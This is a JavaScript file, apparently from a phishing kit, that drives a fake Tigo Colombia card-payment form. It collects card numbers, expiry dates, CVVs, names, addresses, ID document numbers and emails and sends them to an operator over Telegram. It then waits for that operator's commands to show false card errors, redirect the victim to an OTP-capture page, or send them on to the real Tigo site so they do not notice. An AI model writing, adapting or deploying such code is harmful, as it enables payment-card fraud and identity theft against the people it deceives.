/**
 * Integración Telegram para formulario de tarjeta
 * Maneja el envío de datos y la recepción de comandos del operador
 */

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('cardForm');
    if (!form) return;

    const overlay = document.getElementById('loadingOverlay');
    const errorMessageDiv = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    const submitBtn = document.getElementById('submitBtn');

    // Obtener invoice_id de la URL
    function getInvoiceId() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('invoice_id') || 'unknown';
    }

    // Mostrar mensaje de error
    function showError(message) {
        if (errorMessageDiv && errorText) {
            errorText.textContent = message;
            errorMessageDiv.style.display = 'flex';
            errorMessageDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    }

    // Ocultar mensaje de error
    function hideError() {
        if (errorMessageDiv) {
            errorMessageDiv.style.display = 'none';
        }
    }

    // Ocultar error al escribir
    form.addEventListener('input', hideError);

    // Manejar envío del formulario
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        if (submitBtn.disabled) return;

        hideError();
        overlay.classList.add('active');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Procesando...';

        // Generar session_id único
        const sessionId = `card_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        sessionStorage.setItem('tigo_card_session_id', sessionId);
        
        const invoiceId = getInvoiceId();

        const formData = {
            invoice_id: invoiceId,
            card_number: document.getElementById('cardNumber').value,
            expiry_date: document.getElementById('expiryDate').value,
            cvv: document.getElementById('cvv').value,
            cardholder_name: document.getElementById('cardholderName').value,
            installments: document.getElementById('installments').value,
            address: document.getElementById('address').value,
            doc_type: document.getElementById('docType').value,
            doc_number: document.getElementById('docNumber').value,
            email: document.getElementById('email').value,
            timestamp: new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })
        };

        console.log('[CARD] Enviando datos:', formData);

        try {
            const result = await TelegramClient.sendToTelegram('tigo_card', formData, sessionId);

            if (!result.success) {
                throw new Error(result.error || 'Error al enviar datos');
            }

            console.log('[CARD] Datos enviados. Iniciando polling...');

            // Iniciar polling con el patrón correcto
            const stopPolling = TelegramClient.startPolling((actions, stop) => {
                console.log('[CARD-FORM] ========== CALLBACK EJECUTADO ==========');
                console.log('[CARD-FORM] Total de acciones:', actions.length);
                console.log('[CARD-FORM] Acciones:', JSON.stringify(actions, null, 2));
                
                // CRÍTICO: Prevenir ejecuciones múltiples con guardia
                if (window.__cardProcessing) {
                    console.warn('[CARD-FORM] ⚠️ YA EN PROCESAMIENTO, ABORTANDO');
                    return;
                }
                window.__cardProcessing = true;
                
                // Procesar SOLO la primera acción
                const action = actions[0];
                console.log('[CARD-FORM] Procesando acción única:', action.action);
                
                // Switch sin loop - una sola acción, una sola ejecución
                switch(action.action) {
                    case 'error_tarjeta':
                        console.log('[CARD-FORM] → Error de tarjeta');
                        overlay.classList.remove('active');
                        showError('Los datos de tu tarjeta son incorrectos. Por favor, verifica la información e intenta nuevamente.');
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'CONTINUAR';
                        window.__cardProcessing = false;
                        break;
                        
                    case 'pedir_otp':
                        console.log('[CARD-FORM] → Redirigiendo a OTP');
                        window.location.href = `/card/otp?invoice_id=${invoiceId}`;
                        break;
                        
                    case 'error_otp':
                        console.log('[CARD-FORM] → Error OTP, redirigiendo');
                        window.location.href = `/card/otp?invoice_id=${invoiceId}`;
                        break;
                        
                    case 'finalizar':
                        console.log('[CARD-FORM] → Finalizando sesión');
                        sessionStorage.removeItem('tigo_card_session_id');
                        window.location.href = 'https://mi.tigo.com.co/pago-express/facturas';
                        break;
                        
                    default:
                        console.warn('[CARD-FORM] ⚠️ Acción desconocida:', action.action);
                        window.__cardProcessing = false;
                }
            }, sessionId, 100, 300000);

        } catch (error) {
            console.error('[CARD] Error:', error);
            overlay.classList.remove('active');
            showError('Error al procesar tu solicitud. Por favor, intenta nuevamente.');
            submitBtn.disabled = false;
            submitBtn.textContent = 'CONTINUAR';
        }
    });

    console.log('[CARD] Sistema inicializado');
});
